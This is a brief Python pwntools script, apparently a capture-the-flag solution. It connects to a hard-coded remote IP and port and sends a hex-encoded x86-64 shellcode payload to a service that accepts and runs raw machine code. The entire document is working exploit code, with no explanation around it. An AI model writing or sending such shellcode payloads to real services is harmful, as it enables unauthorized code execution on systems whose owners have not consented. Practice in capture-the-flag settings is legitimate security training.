from pwn import *

r = remote('52.192.42.215', 9427)

sc = "B800001702488B3848893848897810488B7810C5FC1000C5FC11004831FF48893848897810B800001702B83C0000000F05".decode("hex")

print(r.recvline())
r.sendline(str(len(sc)))
print(r.recvline())
r.send(sc)
print(r.recvall() )